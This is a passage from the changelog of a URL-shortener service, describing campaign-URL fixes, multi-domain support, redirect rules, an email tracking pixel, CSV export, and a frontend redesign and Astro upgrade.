  the same link, which resolved to one of the two rows, so one of them landed
  on a URL personalized with the other's data. The generator now skips codes
  it already issued in the batch.
- **Existing campaign URLs are repaired at startup.** `_seed_database()` runs
  `backfill_campaign_url_domains()`, which moves NULL-domain campaign URLs to
  the default domain. It is idempotent and keeps `updated_at`. A row whose move
  would violate the UNIQUE (its code is already taken on the default domain,
  or another NULL-domain row shares it) stays NULL and keeps resolving through
  the legacy fallback; startup logs a warning with the count. To review them:
  ```sql
  SELECT id, short_code, campaign_id, created_by, created_at
  FROM urls
  WHERE domain_id IS NULL AND url_type = 'CAMPAIGN'
  ORDER BY short_code;
  ```
  `url_type` stores enum member names, so the literal is `'CAMPAIGN'`;
  `'campaign'` fails with `invalid input value for enum urltype`.
- bcrypt 5.0 strict 72-byte input limit handled in `hash_password` /
  `verify_password` by pre-truncating at the byte boundary; runtime dependency
  pinned to `bcrypt<5` until passlib ships an upstream fix.
- `Jinja2Templates.TemplateResponse` migrated to the new positional `request`
  signature (Starlette removed the legacy form).
- Test-suite assertions updated for FastAPI's switch from `403` to `401` when
  `HTTPBearer` credentials are missing.

### Added (Phase 3.10 — Shlink Lessons, Medium Priority)
- **Multi-domain foundation** (3.10.1). New `Domain` model (`hostname`,
  `is_default`); `URL.domain_id` FK; UNIQUE constraint moved from
  `short_code` to `(domain_id, short_code)` so the same code may exist on
  different hosts. The redirect resolver picks the domain from the request
  `Host` header, falling back to the seeded default domain. Default domain
  is configurable via `DEFAULT_DOMAIN` (default `shurl.griddo.io`) and is
  seeded at app startup. Domain management UI is intentionally deferred —
  single-domain at launch.
- **Dynamic redirect rules** (3.10.2). New `RedirectRule` model with a
  JSONB `conditions` column evaluated in priority order (first match wins).
  Supported condition types: `device` (ios/android/desktop/linux/windows/macos),
  `language` (Accept-Language primary subtag), `query_param`, `before_date`,
  `after_date`, `browser`. Conditions inside a single rule AND together;
  unknown types fail closed. CRUD endpoints under `/api/v1/urls/{code}/rules`.
  Rules evaluate before campaign param injection so personalization still
  applies on top of the chosen target.
- **Email tracking pixel** (3.10.3). `GET /{code}/track` returns the canonical
  43-byte 1×1 transparent GIF with `Cache-Control: no-store`. Pixel hits land
  in the existing `visits` table with `is_pixel=true` (timeline-aligned with
  clicks) and are excluded from click analytics by default.
- **Orphan visits** (3.10.4). New `OrphanVisit` model captures requests that
  hit the redirect path but don't resolve. Type enum: `base_url`,
  `invalid_short_url`, `regular_404` (reserved). Listed via
  `GET /api/v1/analytics/orphan-visits` (auth required).
- **CSV export** (3.10.5). Streaming CSV via `csv.writer` + Starlette
  `StreamingResponse`. Available on URL daily/weekly stats, geo distribution
  and campaign users (`user_data` flattened into columns) using
  `?format=csv`. Default response remains JSON.
- **Configurable redirect behavior** (3.10.6). `REDIRECT_STATUS_CODE`
  (default `302`, accepts `301/302/307/308`) and `REDIRECT_CACHE_LIFETIME`
  (default `0`, emits `private, max-age=0`; positive values emit
  `public, max-age=N`). Settings validate up-front so a typo at deploy time
  fails fast.

### Added (Phase 3.11 — Brand & frontend redesign)
- **Brand identity**: wordmark with the lime "click dot", "s." isotype,
  horizontal/vertical lockups, favicon pack and OG card
  (`design/brand/`, usage in `design/brand/README.md`).
- **Design system**: Tailwind 4 `@theme` tokens (ink + lime scales, type,
  radius, elevation, motion), component classes and patterns, documented in
  `design/DESIGN_SYSTEM.md` and rendered live at `/styleguide/`.
- **Every screen rebuilt** to the UX brief: landing with pricing, login,
  register, 404, links dashboard (quick create with auto-copy, search, type
  filter, tag chips, bulk tag/copy), full link editor with live social
  preview, link details (clicks chart + table, countries, social preview,
  email pixel, smart redirects), campaigns list, 4-step campaign wizard,
  campaign details (opens, recipients, exports), analytics (7-day view,
  typo'd links), settings (account, API & MCP, tags, notifications, plan).
- `GET /api/v1/urls/{short_code}`: fetch one URL.
- `POST /api/v1/urls/fetch-metadata`: OG title/description/image for any
  destination (auth required), used by the live preview.
- `GET /api/v1/urls`: `q` (case-insensitive search over code, title and
  destination) and repeatable `url_type` filters.
- `URLResponse` gains `click_count` (bots and pixel opens excluded),
  `campaign_id` and `user_data`.
- Analytics overview `top_urls` items gain `short_url` and `title`.
- `GET /api/v1/campaigns/{id}` now includes the campaign's `tags`.
- MCP tools `get_url` and `fetch_url_metadata`.

### Changed (Phase 3.11)
- Frontend is a **fully static build**: `@astrojs/node` removed. The link and
  campaign detail pages moved from `/dashboard/urls/[short_code]` and
  `/dashboard/campaigns/[id]` to `/dashboard/link/?code=…` and
  `/dashboard/campaign/?id=…`.
- Analytics overview `top_urls` no longer counts tracking-pixel opens as
  clicks, even with `include_bots=true`.
- Default `CORS_ORIGINS` includes the frontend dev server
  (`http://localhost:4232`).

### Changed — Astro 7
- Frontend upgraded to **Astro 7.3.4** (Vite 8, Rust compiler) with
  `@tailwindcss/vite`/`tailwindcss` 4.3.3 and `@astrojs/check` 0.9.10.
  Requires Node.js ≥ 22.12. The `vite ^7.3.2` npm override was removed
  (Astro 7 needs Vite ≥ 8.0.13); `npm audit` is clean.
- Astro 7 compresses HTML with JSX whitespace rules (`compressHTML: 'jsx'`).
  Three styleguide templates relied on a line break for a space and now use
  an explicit `{' '}`. Every page's rendered text and screenshots (1440 and
  390 px) were compared against the Astro 6 build and match.

### Frontend
- Astro 4 → 6 upgrade. `@astrojs/tailwind` (deprecated for Astro ≥ 5)
  replaced with `@tailwindcss/vite` + Tailwind 4 (CSS-first config in
  `src/styles/global.css`). `@astrojs/node` adapter added to support the
  three client-rendered dynamic dashboard routes that Astro 5+ no longer
  permits without `getStaticPaths()`. `npm audit` is now clean
  (0 vulnerabilities).

### Notes
- The redirect endpoint at root level (`/{short_code}`) is intentionally
  unversioned — short URLs are public-facing and must remain stable.
- AWS SAM template (`template.yaml`) requires no changes: the API Gateway
  uses a catch-all `/{proxy+}` route that forwards everything to the
  FastAPI app, which now mounts under `/api/v1/`.
